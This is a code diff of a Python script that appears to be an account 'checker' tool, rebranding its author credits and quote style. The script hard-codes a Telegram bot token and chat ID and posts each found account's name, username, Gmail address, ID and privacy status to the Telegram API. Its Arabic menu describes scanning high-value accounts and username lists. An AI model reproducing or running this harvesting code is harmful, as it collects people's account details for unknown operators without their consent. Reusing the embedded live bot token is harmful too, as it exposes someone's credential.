@@ -12,8 +12,8 @@ import telebot
 import json
 import threading
 from concurrent.futures import ThreadPoolExecutor
-iid='6539489983'
-tok='7407667965:AAEuEGnytifHOmlnQHWE6pREbJBNptgEQjI'
+iid="6539489983"
+tok="7407667965:AAEuEGnytifHOmlnQHWE6pREbJBNptgEQjI"
 os.system('clear')
 ge,be,gt,bt,hit=0,0,0,0,0
 
@@ -59,7 +59,7 @@ def info(email):
     priv = r['data']['user']['privateAccount']
     
     ff = (f'''
-¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
+¸¸.•´¯•.¸ ¸.•´¯•.¸¸ 
 💚𝙷𝙸𝚃 ☊ : {hit}    
 💚𝙽𝙰𝙼𝙴 : {name}
 💚𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
@@ -70,18 +70,18 @@ def info(email):
 💚𝙸𝙳 : {id}
 💚𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {priv}
 💚𝚅𝙴𝙳𝙾 : {vid}
-¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
-Py : @ii33cc
+¸¸.•´¯•.¸ ¸.•´¯•.¸¸ 
+Py : AHMED_KHANA
    ''')
     requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
   except:
     ff = (f'''
-¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
+¸¸.•´¯•.¸ ¸.•´¯•.¸¸ 
 💚𝙷𝙸𝚃 ☊ : {hit}    
 💚𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
 💚𝙶𝙼𝙰𝙸𝙻 : {email}@gmail.com
-¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
-Py : @ii33cc
+¸¸.•´¯•.¸ .•´¯•.¸¸ 
+Py : AHMED_KHANA
    ''')
     requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
     
@@ -657,7 +657,7 @@ def admin():
 {F}[ = ] 0 - {S}Info Source Code 
 {X}=============================	
 {M}Special developer account 
-{A}https://t.me/hsopyt
+{A}https://t.me/AHMED_KHANA
 {M}Enrer Here 😪👆👆👆	
 	''')
 	try:
@@ -692,7 +692,7 @@ def admin():
 خيـار رقـم 1 يـقوم بـفحص الـحسابات الـعـالـية فـقط خـيـار رقـم 2 يـقـوم بـفـحـص جـمـيـع الـحـسـابـات خـيـار رقـم 3 يـقـوم بـل فـحـص من لـسـتـة يـوزرات 		
 خـيـار رقـم 4 يـكـون بـوت سـحب السـتـات الـخاص بــك يـفـضل عـدم مشـاركته 
 مطـور السـورس		
-{A}https://t.me/hsopyt
+{A}https://t.me/AHMED_KHANA
 {M}Enrer Here 😪👆👆👆			
 		''')
 		
